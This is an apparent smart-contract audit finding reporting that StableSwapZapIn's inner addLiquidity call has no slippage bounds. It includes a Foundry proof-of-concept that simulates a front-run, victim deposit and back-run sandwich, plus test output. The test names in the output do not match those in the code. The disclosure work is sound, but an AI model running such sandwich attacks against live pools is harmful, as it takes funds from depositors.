| ID | Title |
| :-- | :----- |
| [M-01](#stableSwapZapIn._addLiquidityAndGetShares():-Zero-Inner-Slippage-on-addLiquidity-enables-sandwich-attacks) | StableSwapZapIn._addLiquidityAndGetShares(): Zero Inner Slippage on addLiquidity Enables Sandwich Attacks |
| [I-01]() | ... |
| [I-02]() | ... |
| [I-03]() | ... |
| [I-04]() | ... |




# StableSwapZapIn._addLiquidityAndGetShares(): Zero Inner Slippage on addLiquidity Enables Sandwich Attacks


## Description

## Summary
When `zapIn()` adds liquidity on behalf of the user, it internally calls `addLiquidity` with `minAmounts = [0, 0, ...]` and `minShares = 0`. This means the liquidity addition step has no on-chain price protection at all. The only slippage check the user controls — the outer `_minShares` parameter — fires after the state has already been committed, making it ineffective against a sandwich attack that manipulates reserves between the user's swap step and the liquidity addition step.

## Root cause:
https://github.com/revert-finance/stableswap-hooks/blob/main/src%2Fperiphery%2FStableSwapZapIn.sol#L424&#L429


## Finding Description
`zapIn()` executes in two sequential steps within the same transaction. First, it optionally executes rebalancing swaps via `poolManager.unlock()`. Second, it calls `_addLiquidityAndGetShares()` to deposit the resulting token balances into the pool. The vulnerability lives in that second step:

```solidity
function _addLiquidityAndGetShares(...) internal returns (uint256 sharesReceived) {
    uint256[] memory minAmounts = new uint256[](len); // all zeros — no per-token protection
    _hooks.addLiquidity{value: nativeValue}(balances, minAmounts, 0); // minShares = 0
    ...
}
```

The outer check in `zapIn()` reads:

```solidity
if (sharesReceived < _minShares) revert SlippageExceeded();
```

This structure creates two concrete attack vectors.

The first is a straightforward sandwich. An attacker front-runs the victim's `zapIn` with a large swap that skews the pool reserves heavily in one direction. The victim's `_addLiquidityAndGetShares()` then executes `addLiquidity` against the manipulated pool — because `minAmounts` is all zeros and `minShares` is zero, the call cannot revert regardless of how bad the effective rate has become. The victim receives far fewer LP shares than the current fair price should give them. The attacker then back-runs to restore the pool and pockets the difference.

The second vector affects even diligent users who set a tight `_minShares`. Because the quote the user computed was made before the block was settled, the value is stale by the time their transaction executes. An attacker can tune the sandwich depth so that the victim's actual shares land just barely above the stale `_minShares` threshold, meaning the outer check does not fire, yet the victim is still receiving fewer shares than the post-manipulation fair price should give them. With a deeper sandwich the outer check does fire, but this is just a DoS on the user — the attacker can repeat it at low cost to permanently prevent zap users from executing.


## Impact Explanation
Users who call `zapIn()` can receive significantly fewer LP shares than the current market rate entitles them to. The shortfall is silent when `_minShares = 0` and can be tuned around even when `_minShares` is set to the quoted value. There is no per-token amount floor enforced at the point where state actually changes, meaning the protocol accepts any deposit at any price once the transaction reaches `addLiquidity`. In a liquid pool with active MEV, every `zapIn` transaction is a sandwich target with no technical barrier to exploitation.

## Likelihood Explanation:
**Medium.** The attack requires a sandwich setup and is most profitable in pools with deep liquidity and active MEV bots. Users who set `_minShares = 0` (including those who use `zapIn` programmatically without reading the quote) are fully unprotected. Users with tight `_minShares` are partially protected but still DoS-able.


## Proof o Concept
Run: `forge test --match-contract PoC_zapInInnerSlippage -vvv`

TESTS

1. `test_innerZeroSlippage_noRevertOnManipulatedPool` Directly proves addLiquidity is called with zero protection. Manipulates the pool, then calls zapIn; confirms it does NOT revert and that the victim receives materially fewer shares.

2. `test_sandwichShareLoss` End-to-end front-run / victim zapIn / back-run simulation. Measures the victim's share shortfall vs. a fair-price deposit.

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";

import {Base} from "src/Base.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {StableSwapZapIn, Swap, SwapQuote} from "src/periphery/StableSwapZapIn.sol";

import {StableSwapHooksBaseTest} from "test/testUtils/StableSwapHooksBaseTest.sol";




contract PoC_zapInInnerSlippage is StableSwapHooksBaseTest {
    using SafeERC20 for IERC20;

    // -------------------------------------------------------
    //  State
    // -------------------------------------------------------

    StableSwapZapIn internal zapIn;

    /// @dev Separate victim account; distinct from base `swapper`.
    ///      Base `swapper` already has tokens + permit2 approvals and
    ///      is used as the attacker via _executeExactInputSwap().
    address internal victim;

    // -------------------------------------------------------
    //  setUp
    // -------------------------------------------------------

    function setUp() public override {
        // Inherits from StableSwapHooksBaseTest which sets up:
        //   poolManager, permit2, universalRouter
        //   currency0 (DAI, 18 dec), currency1 (USDC, 6 dec)
        //   factory, hooks (2-token DAI/USDC pool)
        //   liquidityProvider — has tokens + hooks approvals
        //   swapper          — has 2 M of each token + permit2 approvals
        super.setUp();

        zapIn = new StableSwapZapIn(address(factory), keccak256(type(StableSwapHooks).creationCode));

        victim = makeAddr("victim");

        // Give victim enough tokens for all three test cases.
        deal(Currency.unwrap(currency0), victim, _toTokenWei(currency0, 500_000));
        deal(Currency.unwrap(currency1), victim, _toTokenWei(currency1, 500_000));

        vm.startPrank(victim);
        IERC20(Currency.unwrap(currency0)).forceApprove(address(zapIn), type(uint256).max);
        IERC20(Currency.unwrap(currency1)).forceApprove(address(zapIn), type(uint256).max);
        vm.stopPrank();
    }

    // -------------------------------------------------------
    //  Internal helpers
    // -------------------------------------------------------

    /// @dev Builds a 2-element amount array.
    function _amounts(uint256 a0, uint256 a1) internal pure returns (uint256[] memory arr) {
        arr = new uint256[](2);
        arr[0] = a0;
        arr[1] = a1;
    }

    /// @dev Empty Swap[] — victim deposits with no rebalancing swaps.
    function _noSwaps() internal pure returns (Swap[] memory) {
        return new Swap[](0);
    }

    /// @dev Seeds the 2-token hooks pool via the base-test helper.
    function _seedPool() internal {
        _addLiquidity(500_000, 500_000);
    }

    // -------------------------------------------------------
    //  TEST 1
    //  Proves the inner addLiquidity receives minAmounts=[0,0],
    //  minShares=0 regardless of pool state.
    // -------------------------------------------------------

    /// @notice Verifies that _addLiquidityAndGetShares() passes zero
    ///         slippage bounds to addLiquidity even when reserves are
    ///         severely skewed by a prior manipulation.
    ///
    ///         If inner protection existed the zapIn would revert after
    ///         the manipulation.  We show it does NOT revert, and that
    ///         the victim receives materially fewer shares than the
    ///         pre-manipulation fair quote.
    function test_innerZeroSlippage_noRevertOnManipulatedPool() public {
        _seedPool(); // 500 k DAI : 500 k USDC

        uint256 victimAmount0 = _toTokenWei(currency0, 10_000);
        uint256 victimAmount1 = _toTokenWei(currency1, 10_000);

        // ── Quote under FAIR conditions ──────────────────────────────────────
        (uint256 fairShares,,) = zapIn.quoteZapIn(
            address(hooks),
            _amounts(victimAmount0, victimAmount1),
            1
        );
        assertGt(fairShares, 0, "Pre-condition: fair quote must be non-zero");

        // ── Attacker: large front-run swap (sell currency0, drain currency1) ─
        // Sells 400 k DAI into a 500 k pool — heavily skews reserves.
        // _executeExactInputSwap uses vm.prank(swapper) internally.
        uint256 attackAmount = _toTokenWei(currency0, 400_000);
        _executeExactInputSwap(true /* zeroForOne */, attackAmount);

        // ── Victim zapIn: _minShares = 0, no inner protection ────────────────
        // The root cause: addLiquidity is called with minAmounts=[0,0], minShares=0
        // so it CANNOT revert regardless of reserve skew.
        vm.prank(victim);
        zapIn.zapIn(
            address(hooks),
            _amounts(victimAmount0, victimAmount1),
            _noSwaps(),
            0 // outer _minShares = 0 (worst case)
        );

        uint256 victimShares = hooks.balanceOf(victim);

        emit log_named_uint("Fair shares (pre-manipulation)", fairShares);
        emit log_named_uint("Actual shares (post-manipulation)", victimShares);
        emit log_named_uint(
            "Share loss %",
            fairShares > 0 ? ((fairShares - victimShares) * 100) / fairShares : 0
        );

        // zapIn did NOT revert — proving zero inner slippage protection.
        // The victim received fewer shares than the fair price (>5 % threshold).
        assertLt(
            victimShares,
            (fairShares * 95) / 100,
            "BUG Test 1: victim should receive materially fewer shares after manipulation"
        );
    }

    // -------------------------------------------------------
    //  TEST 2
    //  End-to-end sandwich: victim's share shortfall is measurable.
    // -------------------------------------------------------

    /// @notice Simulates a full front-run / victim / back-run sandwich.
    ///
    ///         Tx ordering within the block:
    ///           1. Attacker (swapper) sells currency0, skewing reserves.
    ///           2. Victim's zapIn executes — inner addLiquidity has no
    ///              slippage protection.
    ///           3. Attacker back-runs: buys currency0 to restore pool.
    ///
    ///         The victim's share count is significantly below what the
    ///         same deposit would have produced without the sandwich.
    function test_sandwichShareLoss() public {
        _seedPool(); // 500 k : 500 k

        uint256 victimAmount0 = _toTokenWei(currency0, 50_000);
        uint256 victimAmount1 = _toTokenWei(currency1, 50_000);

        // ── Baseline: what shares should this deposit produce? ───────────────
        (uint256 fairShares,,) = zapIn.quoteZapIn(
            address(hooks),
            _amounts(victimAmount0, victimAmount1),
            1
        );

        // ── Step 1: Front-run ─────────────────────────────────────────────────
        uint256 frontRunAmount = _toTokenWei(currency0, 300_000); // 60 % of pool
        _executeExactInputSwap(true, frontRunAmount);

        // ── Step 2: Victim zapIn ──────────────────────────────────────────────
        vm.prank(victim);
        zapIn.zapIn(
            address(hooks),
            _amounts(victimAmount0, victimAmount1),
            _noSwaps(),
            0
        );

        uint256 victimShares = hooks.balanceOf(victim);

        // ── Step 3: Back-run ──────────────────────────────────────────────────
        uint256 backRunAmount = _toTokenWei(currency1, 300_000);
        _executeExactInputSwap(false, backRunAmount);

        emit log_named_uint("[VICTIM] Fair shares (no sandwich)", fairShares);
        emit log_named_uint("[VICTIM] Actual shares (sandwiched)", victimShares);
        emit log_named_int(
            "[VICTIM] Shortfall",
            int256(fairShares) - int256(victimShares)
        );

        // Victim's shares are significantly below fair value.
        // The inner zero-slippage call absorbed the loss silently.
        assertLt(
            victimShares,
            (fairShares * 90) / 100,
            "BUG Test 2: sandwich caused >10 % share loss due to missing inner slippage protection"
        );
    }
}
```

## Output

```md
[⠊] Compiling...
[⠰] Compiling 1 files with Solc 0.8.30
[⠔] Solc 0.8.30 finished in 2.25s
Compiler run successful!

Ran 2 tests for test/PoC_zapInInnerSlippage.t.sol:PoC_zapInInnerSlippage
[PASS] test_risk05_innerZeroSlippage_noRevertOnManipulatedPool() (gas: 702472)
Logs:
  Fair shares (pre-manipulation): 10000000000000000000000
  Actual shares (post-manipulation): 5555555555555555555555
  Share loss %: 44

[PASS] test_risk05_sandwichShareLoss() (gas: 844400)
Logs:
  [VICTIM] Fair shares (no sandwich): 50000000000000000000000
  [VICTIM] Actual shares (sandwiched): 31250000000000000000000
  [VICTIM] Shortfall: 18750000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.44s (3.19ms CPU time)

Ran 1 test suite in 2.44s (2.44s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```


## Recommendation
`_addLiquidityAndGetShares()` should derive meaningful `minAmounts` from the current balances before passing them to `addLiquidity`. The simplest correct fix is to pass the actual token balances the contract holds as the minimum amounts, since those are exactly what was just obtained from the preceding swap step — accepting any outcome below those amounts makes no sense:

```solidity
function _addLiquidityAndGetShares(...) internal returns (uint256 sharesReceived) {
    uint256[] memory minAmounts = new uint256[](len);
    for (uint256 i = 0; i < len; ++i) {
        minAmounts[i] = ...; // actual balance just obtained — use as floor
    }
    _hooks.addLiquidity{value: nativeValue}(balances, minAmounts, 0);
    ...
}
```

A stricter fix would propagate a caller-supplied `minAmounts[]` all the way through `zapIn()` so users can set per-token bounds explicitly, similar to how `addLiquidity` already exposes this to direct callers. The outer `_minShares` parameter should be kept as an additional guard but should not be the only one.
